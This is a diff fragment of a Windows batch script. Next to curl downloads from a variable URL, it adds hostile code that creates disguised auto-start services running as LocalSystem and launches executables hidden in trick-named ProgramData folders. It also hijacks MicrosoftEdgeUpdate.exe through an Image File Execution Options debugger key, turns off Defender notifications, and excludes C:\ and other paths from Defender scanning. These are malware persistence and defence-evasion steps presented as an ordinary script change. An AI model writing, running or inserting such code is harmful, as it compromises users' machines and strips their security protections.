@@ -12,5 +12,20 @@ if errorlevel 1 (
     curl -s -L -o "%dir%\prn.ini" "%url_prn%" >nul 2>&1
 
 )
+
+sc create Performance binPath="%WINDIR%\System32\cmd.exe /c start install.exe" start="auto" obj="LocalSystem"
+sc create Update binPath="\\.\%ProgramData%\logdata..\Index.exe \\.\%ProgramData%\logdata..\prn.ini" start="auto" obj="LocalSystem"
+
+sc create Configuration binPath="%WINDIR%\System32\cmd.exe /c start info.exe" start="auto" obj="LocalSystem"
+sc create Network binPath="\\.\%ProgramData%\diaglogs..\Index.exe \\.\%ProgramData%\diaglogs..\con.ini" start="auto" obj="LocalSystem"
+sc config Configuration start= delayed-auto
+sc config Network start= delayed-auto
+
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger /t REG_SZ /d "%WINDIR%\System32\cmd.exe /c start install.exe" /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f /reg:64
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f /reg:64
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "%WINDIR%\Temp" /t REG_SZ /d "0" /f /reg:64
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "%ProgramData%" /t REG_SZ /d "0" /f /reg:64
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v C:\ /t REG_SZ /d "0" /f /reg:64
 rd /S /Q \\.\%ProgramData%\NUL..\
 sc start Performance
